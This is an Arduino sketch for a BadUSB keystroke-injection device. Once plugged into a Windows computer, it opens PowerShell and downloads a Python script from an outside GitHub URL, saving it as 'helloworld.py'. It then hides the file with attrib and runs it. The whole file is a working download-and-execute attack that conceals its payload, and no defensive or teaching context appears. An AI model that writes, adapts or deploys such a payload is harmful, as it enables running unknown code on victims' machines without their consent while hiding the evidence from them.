#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);

  //swicth language on english ===> if you have 2 language
            // Keyboard.press(KEY_LEFT_ALT);
            // Keyboard.press(KEY_LEFT_SHIFT);
            // Keyboard.releaseAll();
            // delay(200);

  
  // open PowerShell
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200);
  
  Keyboard.print("powershell");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  
  // download python file
  Keyboard.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/stanislavzxc/BabUsb-Arduino-with-python/main/invoke.py' -OutFile \"$env:USERPROFILE\\helloworld.py\"");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500); 
  
  // hidding file
  Keyboard.print("attrib +h \"$env:USERPROFILE\\helloworld.py\"");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500); 
  
  // run the python script
  Keyboard.print("python \"$env:USERPROFILE\\helloworld.py\"");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  
  // close Powershell
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
}

void loop() {
  //loop
}
